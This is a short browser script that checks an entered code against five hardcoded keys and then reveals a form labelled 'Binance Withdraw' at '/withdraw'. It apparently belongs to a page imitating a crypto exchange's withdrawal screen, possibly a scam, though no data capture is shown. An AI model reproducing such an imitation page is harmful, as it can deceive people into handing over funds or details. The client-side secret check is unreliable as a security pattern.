let lastHistoryState = history.state;
window.addEventListener('popstate', (e) => {
  const currentState = history.state;

  // Check if moving forward (new state exists and wasn't the previous state)
    if (currentState && currentState !== lastHistoryState) {
        main.style.display = 'none'
        sectionForm.style.display = 'block'
    } 
    // Else, assume it's a back navigation (or initial load)
    else {
        main.style.display = 'grid'
        sectionForm.style.display = 'none'
    }

    lastHistoryState = currentState;
})

const input = document.getElementById('input')
const keys = ['A3F9-7B2E-4C8D-1E6F', 'X5K9-P2L8-Q3M7-R4N6', '9Z4Y-8W3X-7V2U-6T1S', 'JH7D-KG6F-LI5E-MN4C', '2B4Q-6D8S-1F3G-5H7J']
input.addEventListener('input', function() {
  input.classList.remove('code-input--bad')
  this.value = this.value.toUpperCase()
})

const main = document.getElementById('main')
const sectionForm = document.getElementById('form')
const btn = document.getElementById('btn')
btn.onclick = () => {
  let isOk = false
  for (const key of keys) {
    if (input.value === key) isOk = true
  }
  if (!isOk) {
    input.classList.add('code-input--bad')
    return
  }

  main.style.display = 'none'
  sectionForm.style.display = 'block'
  window.history.pushState(
      {page: 'withdraw'},
      'Binance Withdraw',
      '/withdraw'
    )
    window.scrollTo(0, 0)
}

input.addEventListener('keydown', (e) => {
  if (e.key == 'Enter') btn.click()
})